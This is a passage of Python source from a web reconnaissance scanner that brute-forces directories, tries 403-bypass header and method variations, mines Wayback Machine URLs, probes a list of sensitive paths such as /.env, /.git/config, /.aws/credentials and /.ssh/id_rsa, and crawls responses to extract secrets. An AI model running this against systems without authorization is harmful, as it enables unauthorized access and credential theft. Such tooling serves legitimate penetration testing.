            resp = self._request(session, var["method"], var["url"], headers=var["headers"])
            if resp is None or self._should_filter(resp): return None
            return var, resp

        with ThreadPoolExecutor(max_workers=min(self.threads, 40)) as ex:
            futures = {ex.submit(_try_var, v): v for v in variations}
            for future in as_completed(futures):
                if self._stop.is_set(): break
                result = future.result()
                if result is None: continue
                var, resp = result
                sc = resp.status_code; size = len(resp.content)
                if sc < 400:
                    bypass_found += 1
                    hdrs = var["headers"]; meth = var["method"]
                    technique = ""
                    if hdrs:
                        k = list(hdrs.keys())[0]; v = list(hdrs.values())[0]
                        technique += f"  Header: {k}: {v}"
                    if meth != "GET": technique += f"  Method: {meth}"
                    if not technique:
                        suffix = var["url"][len(base.rstrip("/")):]
                        technique = f"  Path: {suffix}"
                    tqdm.write(Fore.GREEN
                        + f"  [BYPASS ✓] [{sc}] [Size:{size}] {var['url']}"
                        + Fore.CYAN + technique + Fore.RESET)
                    if self.logfile:
                        self._log(f"[BYPASS OK] [{sc}] [Size:{size}] {var['url']} |{technique.strip()}")
                    with self._lock:
                        self.results.append(ScanResult(
                            url=var["url"], status=sc, size=size, method=meth,
                            note=f"403BYPASS {technique.strip()}"
                        ))
                elif self.verbose >= 2:
                    tqdm.write(Fore.RED + f"  [BYPASS] [{sc}] {var['url']}" + Fore.RESET)

        if bypass_found == 0 and self.verbose >= 1:
            tqdm.write(Fore.RED + f"  [403 BYPASS] No bypass found for {base}{path}" + Fore.RESET)
        elif bypass_found:
            tqdm.write(Fore.GREEN
                + f"  [403 BYPASS] {bypass_found} bypass(es) found for {base}{path}" + Fore.RESET)

    # ──────────────────────────────────────────────────────────────────────
    #  INTERACTIVE 403 BYPASS PROMPT  (for wayback)
    # ──────────────────────────────────────────────────────────────────────
    def _ask_wayback_403_bypass(self, session: requests.Session, hits: List[str]):
        n = len(hits)
        tqdm.write(Fore.YELLOW + f"\n  [WAYBACK] {n} URL(s) returned 403 Forbidden." + Fore.RESET)
        if not sys.stdin.isatty(): return
        if n <= 20:
            for i, u in enumerate(hits, 1):
                tqdm.write(Fore.YELLOW + f"    {i:3}. {u}" + Fore.RESET)
        else:
            tqdm.write(Fore.CYAN + f"  Show all {n} URLs? [y/N] → " + Fore.RESET, end="")
            try:
                if input().strip().lower() in ("y","yes"):
                    for i, u in enumerate(hits, 1):
                        tqdm.write(Fore.YELLOW + f"    {i:3}. {u}" + Fore.RESET)
            except (EOFError, KeyboardInterrupt): pass
        tqdm.write(Fore.CYAN + f"\n  Run 403 bypass on {'all ' + str(n) if n > 1 else 'this'} URL(s)? [y/N] → " + Fore.RESET, end="")
        try:
            ans = input().strip().lower()
        except (EOFError, KeyboardInterrupt):
            ans = "n"
        if ans not in ("y","yes"):
            tqdm.write(Fore.YELLOW + "  Skipping bypass." + Fore.RESET)
            return
        for url in hits:
            if self._stop.is_set(): break
            parsed = urlparse(url)
            self._run_bypass(session, f"{parsed.scheme}://{parsed.netloc}", parsed.path)

    # ──────────────────────────────────────────────────────────────────────
    #  WAYBACK MACHINE
    # ──────────────────────────────────────────────────────────────────────
    def _run_wayback(self, session: requests.Session, target_url: str):
        tqdm.write(Fore.MAGENTA + "\n  [WAYBACK] Querying Wayback CDX API..." + Fore.RESET)
        cdx_url = "https://web.archive.org/cdx/search/cdx"
        params  = {
            "url": target_url.rstrip("/") + "/*",
            "collapse": "urlkey", "output": "json",
            "fl": "original,statuscode,timestamp,length",
        }
        try:
            r = None
            for _wb_try in range(3):
                try:
                    # Use explicit (connect, read) timeout — Wayback CDX can be slow to respond
                    r = session.get(cdx_url, params=params, timeout=(15, 60))
                    break
                except (requests.exceptions.Timeout,
                        requests.exceptions.ReadTimeout,
                        requests.exceptions.ConnectTimeout):
                    if _wb_try < 2:
                        tqdm.write(Fore.YELLOW + f"  [WAYBACK] Timeout — retrying ({_wb_try+2}/3)..." + Fore.RESET)
                    else:
                        tqdm.write(Fore.RED + "  [WAYBACK] web.archive.org timed out after 3 attempts. "
                                   "The CDX API is slow right now — try again later." + Fore.RESET)
                        return
                except requests.exceptions.ConnectionError:
                    tqdm.write(Fore.RED + "  [WAYBACK] Cannot reach web.archive.org — check connectivity." + Fore.RESET)
                    return
            if r is None or r.status_code != 200:
                tqdm.write(Fore.RED + f"  [WAYBACK] CDX API returned {r.status_code if r else 'no response'}" + Fore.RESET); return
            rows = r.json()
            if len(rows) <= 1:
                tqdm.write(Fore.YELLOW + "  [WAYBACK] No archived URLs found." + Fore.RESET); return

            unique_urls = sorted({row[0] for row in rows[1:]})
            # Exclude paths already found during dirbust (avoid duplicates)
            already_found_paths = {urlparse(r.url).path for r in self.results}
            unique_urls = [u for u in unique_urls
                           if urlparse(u).path not in already_found_paths]
            tqdm.write(Fore.MAGENTA + f"  [WAYBACK] {len(unique_urls)} unique archived URLs" + Fore.RESET)
            output_lines: list = []
            wayback_404_hits: List[str] = []
            wayback_403_hits: List[str] = []

            # ── MODE: wayback-all ──
            if self.wayback_all:
                tqdm.write(Fore.MAGENTA + f"  [WAYBACK] Printing all {len(unique_urls)} URLs..." + Fore.RESET)
                check_status = False
                if sys.stdin.isatty():
                    tqdm.write(Fore.CYAN + f"\n  Check live status codes for all {len(unique_urls)} URLs? [y/N] → " + Fore.RESET, end="", file=sys.stderr)
                    try: check_status = input().strip().lower() in ("y","yes")
                    except (EOFError, KeyboardInterrupt): check_status = False

                if check_status:
                    pbar = tqdm(total=len(unique_urls), desc="  wayback", leave=False) if not self.no_progress else None
                    def _check_all(wb_url):
                        if self._stop.is_set(): return
                        resp = self._request(session, "GET", wb_url)
                        if pbar: pbar.update(1)
                        sc   = resp.status_code if resp else "ERR"
                        size = len(resp.content) if resp else 0
                        # Apply filter if set
                        if self.wayback_filter_status and isinstance(sc, int):
                            if sc not in self.wayback_filter_status: return
                        sensitive, reason = looks_sensitive(wb_url)
                        sc_color = (Fore.GREEN if isinstance(sc, int) and sc < 300 else
                                    Fore.BLUE  if isinstance(sc, int) and sc < 400 else
                                    Fore.YELLOW if isinstance(sc, int) and sc < 500 else Fore.RED)
                        sens_tag = (Fore.RED + f" ⚑ {reason}" + Fore.RESET) if sensitive else ""
                        line = f"  [{sc}] [{size}B] {wb_url}"
                        tqdm.write(sc_color + line + Fore.RESET + sens_tag)
                        with self._lock:
                            output_lines.append(line + (f"  # {reason}" if sensitive else ""))
                            if isinstance(sc, int) and sc == 404: wayback_404_hits.append(wb_url)
                            if isinstance(sc, int) and sc == 403: wayback_403_hits.append(wb_url)
                    try:
                        with ThreadPoolExecutor(max_workers=min(self.threads, 50)) as ex:
                            futs = [ex.submit(_check_all, u) for u in unique_urls]
                            for f in as_completed(futs):
                                if self._stop.is_set(): [ff.cancel() for ff in futs]; break
                                try: f.result()
                                except Exception: pass
                    finally:
                        if pbar: pbar.close()
                else:
                    for wb_url in unique_urls:
                        if self._stop.is_set(): break
                        sensitive, reason = looks_sensitive(wb_url)
                        colour = Fore.RED if sensitive else Fore.WHITE
                        tag    = f" ⚑ {reason}" if sensitive else ""
                        tqdm.write(colour + f"  {wb_url}{tag}" + Fore.RESET)
                        output_lines.append(wb_url + (f"  # {reason}" if sensitive else ""))

            # ── MODE: sensitive (default) ──
            else:
                sensitive_urls = [(u, r) for u in unique_urls for ok, r in [looks_sensitive(u)] if ok]
                tqdm.write(Fore.MAGENTA
                    + f"  [WAYBACK] {len(sensitive_urls)} sensitive-keyword matches — checking live..."
                    + Fore.RESET)
                if not sensitive_urls:
                    tqdm.write(Fore.YELLOW + "  [WAYBACK] No sensitive-keyword matches. Use --wayback-all for everything." + Fore.RESET)
                    return

                pbar = tqdm(total=len(sensitive_urls), desc="  wayback", leave=False) if not self.no_progress else None

                def _check_sensitive(wb_url, sens_reason):
                    if self._stop.is_set(): return
                    resp = self._request(session, "GET", wb_url)
                    if pbar: pbar.update(1)
                    if resp is None: return
                    sc = resp.status_code; size = len(resp.content)
                    # Apply status filter
                    if self.wayback_filter_status and sc not in self.wayback_filter_status: return
                    if sc < 300: colour = Fore.GREEN
                    elif sc < 400: colour = Fore.BLUE
                    elif sc == 403: colour = Fore.YELLOW; wayback_403_hits.append(wb_url)
                    elif sc == 404: colour = Fore.WHITE;  wayback_404_hits.append(wb_url)
                    elif sc >= 500: colour = Fore.MAGENTA
                    else:           colour = Fore.RED
                    reason_tag = Fore.RED + f" ⚑ {sens_reason}" + Fore.RESET if sens_reason else ""
                    line = f"  [WAYBACK] [{sc}] [{size}B] {wb_url}"
                    tqdm.write(colour + line + Fore.RESET + reason_tag)
                    with self._lock: output_lines.append(line + (f"  # {sens_reason}" if sens_reason else ""))
                    if sc not in (404,400,410) and not self._should_filter(resp):
                        r2 = ScanResult(url=wb_url, status=sc, size=size, note=f"WAYBACK {sens_reason}")
                        if self.do_extract_secrets and sc < 400:
                            r2.secrets = extract_secrets(wb_url, resp.text)
                            if r2.secrets:
                                with self._lock: self.all_secrets.extend(r2.secrets)
                        with self._lock: self.results.append(r2)
                        if self.logfile: self._log(self._format_result(r2))

                try:
                    ex2 = ThreadPoolExecutor(max_workers=min(self.threads, 50))
                    futs2 = [ex2.submit(_check_sensitive, u, reason) for u, reason in sensitive_urls]
                    for f in as_completed(futs2):
                        if self._stop.is_set(): [ff.cancel() for ff in futs2]; break
                        try: f.result()
                        except Exception: pass
                finally:
                    ex2.shutdown(wait=False)
                    if pbar: pbar.close()

                if wayback_403_hits and not self._stop.is_set():
                    self._ask_wayback_403_bypass(session, wayback_403_hits)

            # ── Wayback archive tip for 404 / 403 ──
            if not self.wayback_filter_status:
                total_gone = len(wayback_404_hits) + len(wayback_403_hits)
                if total_gone > 0:
                    tqdm.write(
                        Fore.CYAN + Style.BRIGHT +
                        f"\n  ╔══ TIP ══╗  {total_gone} URL(s) returned 404/403 — they may be archived!\n"
                        f"  ║  Visit  ║  https://web.archive.org/web/*/YOURURL\n"
                        f"  ║  or use ║  https://timetravel.mementoweb.org  to retrieve old snapshots\n"
                        f"  ╚═════════╝" + Style.RESET_ALL
                    )

            # ── Save to file ──
            if self.wayback_output and output_lines:
                try:
                    with open(self.wayback_output, "w", encoding="utf-8") as fh:
                        fh.write("\n".join(output_lines) + "\n")
                    tqdm.write(Fore.GREEN + f"  [WAYBACK] Saved → {self.wayback_output}" + Fore.RESET)
                except Exception as e:
                    tqdm.write(Fore.RED + f"  [WAYBACK] Save failed: {e}" + Fore.RESET)

        except (requests.exceptions.Timeout, requests.exceptions.ReadTimeout,
                requests.exceptions.ConnectTimeout):
            tqdm.write(Fore.RED + "  [WAYBACK] web.archive.org timed out. Try again later." + Fore.RESET)
        except requests.exceptions.ConnectionError:
            tqdm.write(Fore.RED + "  [WAYBACK] Cannot reach web.archive.org — check connectivity." + Fore.RESET)
        except Exception as e:
            tqdm.write(Fore.RED + f"  [WAYBACK] Unexpected error querying CDX API — skipping." + Fore.RESET)
            if self.debug:
                tqdm.write(Fore.RED + f"  [WAYBACK] Debug: {e}" + Fore.RESET)

    # ──────────────────────────────────────────────────────────────────────
    #  SMART PROBE
    # ──────────────────────────────────────────────────────────────────────
    PROBE_EXTS = {".js",".jsx",".ts",".mjs",".json",".jsonc",".json5",
                  ".env",".config",".config.js",".yml",".yaml",".xml",
                  ".toml",".ini",".cfg",".graphql",".gql",".wasm",".map"}

    KNOWN_PATHS = [
        "/app.js","/main.js","/bundle.js","/index.js","/app.min.js",
        "/static/js/main.js","/static/js/bundle.js","/assets/js/app.js",
        "/dist/app.js","/dist/bundle.js","/build/static/js/main.js",
        "/api","/api/v1","/api/v2","/graphql","/graphiql",
        "/swagger.json","/swagger.yaml","/openapi.json","/openapi.yaml",
        "/api-docs","/api/docs","/api/schema",
        "/.env","/.env.local","/.env.production","/.env.development",
        "/.env.example","/.env.backup","/.env.bak",
        "/.git/config","/.git/HEAD","/.git/COMMIT_EDITMSG",
        "/.gitignore","/.npmrc","/.yarnrc","/.dockerignore",
        "/Dockerfile","/docker-compose.yml","/docker-compose.yaml",
        "/config.js","/config.json","/config.yaml","/config.yml",
        "/settings.js","/settings.json","/app.config.js",
        "/webpack.config.js","/vite.config.js","/next.config.js",
        "/package.json","/package-lock.json","/yarn.lock",
        "/composer.json","/requirements.txt","/Pipfile",
        "/web.config","/server.xml","/application.properties",
        "/app.js.map","/main.js.map","/bundle.js.map",
        "/robots.txt","/sitemap.xml","/sitemap_index.xml",
        "/server-status","/server-info","/_profiler","/__debug__",
        "/debug/pprof","/metrics","/health","/healthz","/ready",
        "/status","/version","/info","/ping",
        "/wp-config.php","/wp-login.php","/wp-json/wp/v2/users",
        "/xmlrpc.php","/readme.html","/license.txt",
        "/phpinfo.php","/info.php","/test.php",
        "/backup.zip","/backup.tar.gz","/backup.sql",
        "/dump.sql","/database.sql","/db.sql",
        "/.aws/credentials","/.ssh/id_rsa","/.ssh/authorized_keys",
        "/actuator","/actuator/health","/actuator/env","/actuator/beans",
        "/actuator/mappings","/actuator/logfile",
        "/.well-known/security.txt","/.well-known/openid-configuration",
        "/crossdomain.xml","/clientaccesspolicy.xml",
        "/trace.axd","/elmah.axd","/WebResource.axd",
        "/__webpack_hmr","/_next/static","/static/",
        "/console","/manager","/manager/html","/jmx-console",
        "/phpMyAdmin","/phpmyadmin","/pma","/adminer.php",
    ]

    def _probe_all_dirs(self, session: requests.Session, dirs: List[str]):
        """Probe every scanned directory (excluding confirmed dir-listing dirs) for
        well-known sensitive paths.  Runs as one consolidated section so output
        stays clean: single header → all findings → single summary.
        """
        if not dirs:
            return

        # Snapshot paths already found so we never duplicate a dirbust/crawl hit
        already_known: set = {
            urlparse(r.url).path.rstrip("/").lower()
            for r in self.results
        }

        # Build probe URL list: KNOWN_PATHS appended to every target dir.
        # For the root URL, also harvest asset paths from the page body.
        probe_urls: set = set()
        parsed_base = urlparse(self.url)
        origin = f"{parsed_base.scheme}://{parsed_base.netloc}"

        base_resp = self._request(session, "GET", self.url)
        if base_resp and base_resp.status_code < 400:
            body = base_resp.text
            for m in re.finditer(
                r'(?:src|href|action|data-src|import|require|from)\s*[=\(\'\"]\s*[\'"]?([^\s\'"<>{}\[\]()]+)',
                body, re.IGNORECASE
            ):
                path = m.group(1).strip().split("?")[0].split("#")[0]
                if not path or path.startswith(("//", "mailto:")): continue
                if path.startswith("http"):
                    if path.startswith(origin): probe_urls.add(path)
                elif path.startswith("/"): probe_urls.add(origin + path)
                else: probe_urls.add(self.url.rstrip("/") + "/" + path)
            probe_urls = {u for u in probe_urls
                          if any(urlparse(u).path.lower().endswith(ext) for ext in self.PROBE_EXTS)}

        for target_dir in dirs:
            root = target_dir.rstrip("/")
            for kp in self.KNOWN_PATHS:
                probe_urls.add(root + kp)

        tqdm.write(Fore.CYAN + f"\n  [PROBE] Checking {len(probe_urls)} paths across {len(dirs)} director{'y' if len(dirs)==1 else 'ies'}..." + Fore.RESET)
        found = 0

        def _probe_one(url: str):
            nonlocal found
            if self._stop.is_set(): return
            resp = self._request(session, "GET", url)
            if resp is None: return
            sc = resp.status_code
            if sc in (404, 400, 410): return
            if urlparse(url).path.rstrip("/").lower() in already_known: return
            body = resp.text
            size  = len(resp.content)
            lines = body.count("\n") + 1 if body.strip() else 0
            words = len(body.split())     if body.strip() else 0
            result = ScanResult(url=url, status=sc, size=size, lines=lines, words=words, note="PROBE")
            with self._lock:
                self.results.append(result)
                found += 1
            with self._print_lock:
                tqdm.write(self._format_result(result))
                if self.logfile: self._log(self._format_result(result))
            if self.do_extract_secrets and sc < 400:
                secrets = extract_secrets(url, resp.text)
                if secrets:
                    with self._lock: self.all_secrets.extend(secrets)
                    for s in secrets:
                        tqdm.write(Fore.RED + f"    [{s['type']}] {s['value'][:120]}" + Fore.RESET)

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futs = [executor.submit(_probe_one, u) for u in probe_urls]
            for f in as_completed(futs):
                if self._stop.is_set(): break
                try: f.result()
                except Exception: pass

        tqdm.write(Fore.CYAN + f"  [PROBE] Done — {found} finding(s) across {len(dirs)} director{'y' if len(dirs)==1 else 'ies'}." + Fore.RESET)

    # ──────────────────────────────────────────────────────────────────────
    #  PRECHECKS + CALIBRATION
    # ──────────────────────────────────────────────────────────────────────
    def _prechecks(self, session: requests.Session) -> bool:
        tqdm.write(Fore.CYAN + "  [*] Calibrating server..." + Fore.RESET)
        try:
            probe = session.get(self.url, timeout=15, allow_redirects=True)
            # Update base_url to landing URL if redirected to a different path
            if probe.url != self.url:
                tqdm.write(Fore.YELLOW
                    + f"  [*] Redirected: {self.url} → {probe.url}" + Fore.RESET)
                self.url = probe.url if probe.url.endswith("/") else probe.url + "/"
        except requests.exceptions.ConnectionError:
            tqdm.write(Fore.RED + f"  [!] Cannot reach {self.url}" + Fore.RESET); return False
        except requests.exceptions.Timeout:
            tqdm.write(Fore.RED + f"  [!] Server timeout (15s) — try --timeout 30" + Fore.RESET); return False
        except Exception as e:
            tqdm.write(Fore.RED + f"  [!] Connection error: {e}" + Fore.RESET); return False

        latencies = []
        for _ in range(5):
            t0 = time.monotonic()
            try:
                session.get(self.url, timeout=15, allow_redirects=False)
                latencies.append(time.monotonic() - t0)
            except Exception: pass

        if latencies:
            avg_ms = sum(latencies)/len(latencies)*1000
            p95_ms = sorted(latencies)[int(len(latencies)*0.95)]*1000
            if self.timeout == DEFAULT_TIMEOUT:
                self.timeout = max(5, int(sorted(latencies)[-1]*5)+2)
            tqdm.write(Fore.CYAN
                + f"  [*] Latency avg={avg_ms:.0f}ms p95={p95_ms:.0f}ms → timeout={self.timeout}s threads={self._current_threads}"
                + Fore.RESET)
        else:
            tqdm.write(Fore.YELLOW + "  [!] Could not measure latency — using defaults" + Fore.RESET)

        rand_path = ''.join(choice(ascii_letters) for _ in range(24))
        r = self._request(session, "GET", self.url + rand_path)
        if r and r.status_code not in (404, 400, 410):
            self.wildcard_hash = page_hash(r.content)
            self.wildcard_body = r.content
            if not self.force:
                tqdm.write(Fore.YELLOW
                    + f"  [WARN] Wildcard detected (→{r.status_code}). Use --force to scan anyway." + Fore.RESET)
                return False
            else:
                tqdm.write(Fore.YELLOW + "  [WARN] Wildcard detected, --force enabled." + Fore.RESET)

        if self.filter_similar:
            r2 = self._request(session, "GET", self.filter_similar)
            if r2: self.filter_similar_body = r2.content

        if self.user and self.password:
            self.auth = HTTPBasicAuth(self.user, self.password)
            r3 = self._request(session, "POST", self.url)
            if r3 and r3.status_code == 401:
                tqdm.write(Fore.RED + "  [AUTH] Credentials rejected (401). Aborting." + Fore.RESET)
                return False

        return True

    # ──────────────────────────────────────────────────────────────────────
    #  SCAN DIRECTORY
    # ──────────────────────────────────────────────────────────────────────
    def _scan_dir(self, base_url: str, extra_words: List[str] = None,
                  extra_exts: List[str] = None):
        """Brute-force base_url with wordlist × extensions.

        extra_words / extra_exts are used for second-pass sweeps (-g / -E):
        they are tried in addition to the main wordlist/exts but only combinations
        not already requested (tracked via _requested_targets).
        """
        thread_local = threading.local()
        def get_session():
            if not hasattr(thread_local, "session"):
                thread_local.session = self._make_session()
            return thread_local.session

        if extra_words is not None or extra_exts is not None:
            # Second-pass sweep: only the new words × current exts  +
            #                    current wordlist × new exts
            wordlist = list(extra_words) if extra_words else []
            exts_to_use = self.exts
            combos: List[str] = []
            if extra_words:
                combos += [
                    (w.strip().rstrip("/") if e == "" else w.strip().rstrip("/") + e)
                    for w in extra_words for e in self.exts if w.strip()
                ]
            if extra_exts:
                combos += [
                    (w.strip().rstrip("/") + e)
                    for w in self.wordlist for e in extra_exts if w.strip()
                ]
        else:
            # First pass: full wordlist × extensions
            wordlist = self.wordlist[:]
            combos = [
                (w.strip().rstrip("/") if e == "" else w.strip().rstrip("/") + e)
                for w in wordlist for e in self.exts if w.strip()
            ]

        if not combos:
            return

        total = len(combos)
        pbar = None
        if not self.no_progress:
            label = base_url.rstrip("/").rsplit("/", 1)[-1] or "/"
            suffix = " [+words]" if extra_words else " [+exts]" if extra_exts else ""
            pbar = tqdm(total=total, desc=f"  {label}{suffix}", leave=False)
        executor = None
        try:
            executor = ThreadPoolExecutor(max_workers=self._current_threads)
            futures = [executor.submit(self._brute, get_session, base_url, combo, pbar)
                       for combo in combos]
            for future in as_completed(futures):
                if self._stop.is_set(): [f.cancel() for f in futures]; break
                try: future.result()
                except Exception as e:
                    if self.debug: tqdm.write(Fore.RED + f"  [ERR] {e}" + Fore.RESET)
        finally:
            if executor: executor.shutdown(wait=False)
            if pbar: pbar.close()

    def _run_all_bypasses(self, session):
        if not self._pending_bypass: return
        tqdm.write(Fore.YELLOW + f"\n  [403 BYPASS] Running on {len(self._pending_bypass)} forbidden URLs..." + Fore.RESET)
        for base, path in self._pending_bypass:
            if self._stop.is_set(): break
            self._run_bypass(session, base, path)

    def _run_secrets_pass(self):
        if not self._pending_secret_urls: return
        tqdm.write(Fore.CYAN + f"\n  [SECRETS] Scanning {len(self._pending_secret_urls)} responses..." + Fore.RESET)
        found_count = 0
        # Seed seen-set from secrets already collected inline during scan
        seen = {s["type"] + "|" + s["value"][:80] for s in self.all_secrets}
        for url, body in self._pending_secret_urls:
            if self._stop.is_set(): break
            for s in extract_secrets(url, body):
                key = s["type"] + "|" + s["value"][:80]
                if key in seen: continue
                seen.add(key); self.all_secrets.append(s)
                tqdm.write(Fore.RED + f"  [SECRET] [{s['type']}] {s['value'][:120]}" + Fore.RESET)
                tqdm.write(Fore.YELLOW + f"    URL: {url}" + Fore.RESET)
                if self.logfile: self._log(f"[SECRET] [{s['type']}] {s['value']} @ {url}")
                found_count += 1
        if found_count == 0:
            tqdm.write(Fore.GREEN + "  [SECRETS] No new secrets found." + Fore.RESET)
        else:
            tqdm.write(Fore.RED + f"  [SECRETS] {found_count} new unique secret(s) found!" + Fore.RESET)

    # ──────────────────────────────────────────────────────────────────────
    #  SECRETS CRAWL  (NEW) — crawl found URLs for additional secrets
    # ──────────────────────────────────────────────────────────────────────
    def _run_secrets_crawl(self, session: requests.Session):
        """After secrets pass, crawl found URLs to extract deeper secrets."""
        interesting = [r for r in self.results if r.status < 400 and "BYPASS" not in r.note]
        if not interesting: return
        tqdm.write(Fore.CYAN + f"\n  [SECRETS-CRAWL] Deep-crawling {len(interesting)} found URLs..." + Fore.RESET)
        found_count = 0; seen_secret_keys = {s["type"]+"|"+s["value"][:80] for s in self.all_secrets}

        def _crawl_and_scan(result: ScanResult):
            nonlocal found_count
            if self._stop.is_set(): return
            resp = self._request(session, "GET", result.url)
            if resp is None or resp.status_code >= 400: return
            links = extract_links(result.url, resp.text, same_origin_only=False)
            # Scan response body for secrets
            for s in extract_secrets(result.url, resp.text):
                key = s["type"]+"|"+s["value"][:80]
                with self._lock:
                    if key not in seen_secret_keys:
                        seen_secret_keys.add(key)
                        self.all_secrets.append(s)
                        found_count += 1
                        tqdm.write(Fore.RED + f"  [SECRET-CRAWL] [{s['type']}] {s['value'][:120]}" + Fore.RESET)
                        tqdm.write(Fore.YELLOW + f"    URL: {result.url}" + Fore.RESET)
            # Also probe linked JS / config files
            for link in links:
                if any(link.endswith(ext) for ext in [".js",".json",".env",".config",".yaml",".yml",".xml",".ts"]):
                    r2 = self._request(session, "GET", link)
                    if r2 and r2.status_code < 400:
                        for s in extract_secrets(link, r2.text):
                            key = s["type"]+"|"+s["value"][:80]
                            with self._lock:
                                if key not in seen_secret_keys:
                                    seen_secret_keys.add(key); self.all_secrets.append(s)
                                    found_count += 1
                                    tqdm.write(Fore.RED + f"  [SECRET-CRAWL] [{s['type']}] {s['value'][:120]}" + Fore.RESET)
                                    tqdm.write(Fore.YELLOW + f"    Found at: {link}" + Fore.RESET)

        with ThreadPoolExecutor(max_workers=min(self.threads, 20)) as ex:
            futs = [ex.submit(_crawl_and_scan, r) for r in interesting]
            for f in as_completed(futs):
                if self._stop.is_set(): break
                try: f.result()
                except Exception: pass
        if found_count:
            tqdm.write(Fore.RED + f"  [SECRETS-CRAWL] {found_count} additional secrets found!" + Fore.RESET)
        else:
            tqdm.write(Fore.GREEN + "  [SECRETS-CRAWL] No additional secrets found." + Fore.RESET)

    # ──────────────────────────────────────────────────────────────────────
    #  MAIN ENTRY
    # ──────────────────────────────────────────────────────────────────────
    def checkAndRun(self) -> List[ScanResult]:
        if not self.quiet: tqdm.write(pretty_banner(self.no_color))

        # Windows-safe signal handler
        def _handle_sigint(sig, frame):
            self._stop.set()
            tqdm.write(Fore.YELLOW + "\n  [!] Ctrl+C — stopping..." + Fore.RESET)
        try: signal.signal(signal.SIGINT, _handle_sigint)
        except (OSError, ValueError): pass  # Windows/thread context safety

        session = self._make_session()
        if not self._prechecks(session): sys.exit(0)
        if self.logfile: Path(self.logfile).write_text("")
        if not self.quiet: self._print_header()
        self.start_time = time.perf_counter()

        if self.wayback_only:
            self._run_wayback(session, self.url)
            self._print_summary(); return self.results

        if self.bypass_only:
            targets = []; seen_bp = set()
            for raw in ([self.url.rstrip("/")] + self.bypass_urls):
                if raw not in seen_bp: seen_bp.add(raw); targets.append(raw)
            tqdm.write(Fore.YELLOW + f"\n  [403 BYPASS] Bypass-only — {len(targets)} target(s)" + Fore.RESET)
            for raw_url in targets:
                if self._stop.is_set(): break
                if not raw_url.startswith(("http://","https://")): raw_url = _detect_scheme(raw_url)
                parsed = urlparse(raw_url.rstrip("/"))
                self._run_bypass(session, f"{parsed.scheme}://{parsed.netloc}", parsed.path or "/")
            self._print_summary(); return self.results

        # ── SCAN LOOP ──────────────────────────────────────────────────────
        # Per directory the order is always:
        #   1. Dirbust       — wordlist × extensions against this dir
        #   1b. Second pass  — new words (-g/--links) and/or new exts (-E) found during pass 1
        #   2. Crawl         — parse pages found by dirbust, surface missed endpoints
        #   3. Collect       — new dirs from BOTH dirbust AND crawl → queue for next depth
        # ──────────────────────────────────────────────────────────────────
        scanned: Set[str] = set()
        queue: List[str]  = [self.url]
        cur_depth = 0
        crawl_banner_printed = False

        def _should_recurse_into(dir_url: str) -> bool:
            """Return True if this directory should be queued for recursion.
            Dir-listing dirs bypass SMART_SKIP_DIRS — they are crawl-only."""
            if dir_url in scanned: return False
            if self.no_recursion: return False
            if dir_url in self.dir_listing_dirs: return True   # always recurse, crawl-only
            if self.smart_recurse:
                seg = dir_url.rstrip("/").rsplit("/", 1)[-1].lower()
                if seg in SMART_SKIP_DIRS: return False
            return True

        try:
            while queue and (self.depth == 0 or cur_depth <= self.depth):
                if self._stop.is_set(): break
                current_batch = queue[:]; queue = []

                for base in current_batch:
                    if self._stop.is_set(): break
                    if base in scanned: continue
                    scanned.add(base)

                    # ── Dir-listing shortcut: skip wordlist dirbust entirely ─
                    # The server already exposes every file via the listing page.
                    # Just crawl it to harvest links and queue any sub-directories.
                    if base in self.dir_listing_dirs:
                        if self.crawl and not self._stop.is_set():
                            for p in sorted(self._crawl_for_dir(session, base, [])):
                                if _should_recurse_into(p) and p not in queue:
                                    queue.append(p)
                        continue

                    # ── Step 1: Dirbust this directory ─────────────────────
                    tqdm.write(Fore.CYAN + f"\n  [DIR] Scanning: {base}" + Fore.RESET)
                    results_before = len(self.results)
                    fp_before      = len(self.found_paths)
                    words_before   = set(self.discovered_words)
                    exts_before    = set(self.discovered_exts)

                    self._scan_dir(base)

                    # ── Step 1b: Second passes for -g/--links and -E ────────
                    # Run BEFORE crawl so crawl can also see expanded results

                    # -g / --links: try words discovered during this dir's scan
                    if (self.collect_words or self.do_extract_links) and not self._stop.is_set():
                        new_words = self.discovered_words - words_before
                        if new_words:
                            tqdm.write(Fore.CYAN + f"  [-g] {len(new_words)} new word(s) discovered — rescanning {base}" + Fore.RESET)
                            self._scan_dir(base, extra_words=list(new_words))

                    # -E: try extensions collected during this dir's scan
                    if self.collect_exts and not self._stop.is_set():
                        # Convert discovered extension strings → extension list, deduplicate vs current
                        new_exts = [e for e in (self.discovered_exts - exts_before)
                                    if e not in self.exts]
                        if new_exts:
                            self.exts.extend(new_exts)  # keep for future scans too
                            tqdm.write(Fore.CYAN + f"  [-E] {len(new_exts)} new extension(s) found: {' '.join(new_exts)} — rescanning {base}" + Fore.RESET)
                            self._scan_dir(base, extra_exts=new_exts)

                    # Dirs discovered by dirbust + second passes
                    dirbust_dirs = [p for p in self.found_paths[fp_before:]]

                    # ── Step 2: Crawl using THIS dir's dirbust results ──────
                    crawl_dirs: Set[str] = set()
                    if self.crawl and not self._stop.is_set():
                        if not crawl_banner_printed:
                            tqdm.write(Fore.CYAN + "\n  [CRAWL] Crawling discovered paths..." + Fore.RESET)
                            crawl_banner_printed = True
                        dir_results = self.results[results_before:]
                        crawl_dirs  = self._crawl_for_dir(session, base, dir_results)

                    # ── Step 3: Collect ALL new dirs → recursion queue ──────
                    all_new_dirs: Set[str] = set(dirbust_dirs) | crawl_dirs
                    for p in sorted(all_new_dirs):
                        if _should_recurse_into(p) and p not in queue:
                            queue.append(p)

                cur_depth += 1

        except Exception as e:
            if self.debug:
                import traceback; traceback.print_exc()
                tqdm.write(Fore.RED + f"  [SCAN ERR] {e}" + Fore.RESET)

        # PHASE 2 — Probe: all scanned dirs except open dir-listings (already exposed)
        if self.probe and not self._stop.is_set():
            probe_targets = sorted(d for d in scanned if d not in self.dir_listing_dirs)
            self._probe_all_dirs(session, probe_targets)

        # PHASE 3 — 403 Bypass
        if self.bypass_403 and not self._stop.is_set():
            self._run_all_bypasses(session)
        self._pending_bypass.clear()

        # PHASE 4 — Secret extraction
        if self.do_extract_secrets:
            self._run_secrets_pass()
            if not self._stop.is_set():
                self._run_secrets_crawl(session)

        # PHASE 5 — Wayback Machine (runs regardless of recursion state)
        if self.wayback:
            self._run_wayback(session, self.url)

        self._print_summary()
        return self.results

    # ──────────────────────────────────────────────────────────────────────
    #  OUTPUT HELPERS
    # ──────────────────────────────────────────────────────────────────────
    def _log(self, text: str):
        if self.logfile:
            with self._lock:
